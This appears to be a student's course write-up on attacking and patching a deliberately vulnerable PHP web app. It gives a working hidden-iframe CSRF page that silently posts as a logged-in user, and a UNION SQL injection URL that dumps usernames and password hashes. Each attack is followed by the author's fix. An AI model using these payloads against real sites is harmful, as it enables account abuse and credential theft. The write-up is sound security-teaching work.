# Project Writeup (Part 2)

1. The hackme application is vulnerable to arbitrary POST requests made to `post.php`. If an user submits a POST request with the fields `title`, `message`, and `post_submit` the application will create a new post with the content of the POST. I exploit this vulnerability to post a message without a logged in user realizing what happened. 

 Typically JavaScript is required to execute actions on the web, especially if you don't want the user to know what happened. However modern browsers have CSRF protections built in and don't allow JavaScript to submit POST requests to other domains. But, I can still submit a form using the HTML form element that has its action set to the URL of `post.php`. I don't want the user to realize what happened, so I submit the form in a hidden iframe that is loaded when the user loads the attack page. 

 Two files are required for this attack, the attack page and the hidden iframe. Both are included below.

 ```
 hackme-csrf.html
 <!doctype html>
	<html lang="en">
	<head>
		<title>You win!</title>
	</head>
	<body>
		<h1>You win!</h1>
		<p>That's it, there's nothing else.</p>
		<iframe src="hidden-csrf.html" style="display:none;"></iframe>
	</body>
</html>
```

 ```
 hidden-csrf.html
 <form method="POST" action="http://10.121.20.103/hackme/post.php">
        <input type="hidden" name="title" value="You won!">    
        <input type="hidden" name="message" value="You have been selected for a free flying dragon ride.">
        <input type="hidden" name="post_submit" value="true">
        <button type="submit">Claim your prize!</button>       
 </form> 
        
 <script>                                                       
        //Onload, submit the form                              
        document.querySelector("form").submit();               
 </script>
 ```

 I implemented a nonce system in order to close this vulnerability. The application generates a random hash and stores it in the user's session. This hash is then output on the post form as a hidden value. When the user submits the page normally, they submit the hash and the system checks that it matches the originally generated hash. Every time the user attempts to verify the hash, a new one is generated thus preventing short term replay attacks (although it might be possible to generate the same hash twice in a row, the likelihood of this is extremely low). A failure to validate prevents the form from submitting and displays an error message. Attackers have no way of gaining access to the nonce hash unless they are able to hijack the user's session; in that case a nonce wouldn't stop the attacker from posting as the user. The user's session is protected by a unique session ID and the use of HTTPS. 


2. The original hackme application is extremely vulnerable to most kinds of SQL injection attacks. Input is not sanitized and attackers can input arbitrary SQL code. I can take advantage of this to force the application to display all users and their hashed passwords. This attack is possible because `show.php` interprets user input from the GET URL to display a post based upon a given ID. The original command expects and ID: `SELECT * FROM threads WHERE id = '".$_GET[pid]."'`

 But, an attacker can manipulate the URL to change the command: `/hackme/show.php?pid=' UNION DISTINCT SELECT null, pass as username, username, null, null FROM users WHERE 1=1 OR username='`. 

 A union operation is performed which grabs the `username` and `pass` fields from the `users` table. Null values are used because you can only perform unions between tables that have an identical number of columns. I alias `pass` as `username` so that the application logic will display its value in the username slot on the `show.php` page.

 In order to fix this, I no longer use direct `mysql_query` commands. Instead I pass formatted string along with an array of values to the `pass` method of `SiteAuthentication`. This method loops through all the values in the array and passes them to `mysqli_real_escape_string()` which returns an escaped version of the value. Finally these values are replaced in the formatted string and executed. A more robust solution in the real world would use PDO or mysqli prepared statements which prevents changing the SQL command once the string has been compiled. However for this assignment, my solution is effective at stopping the above attack and others.
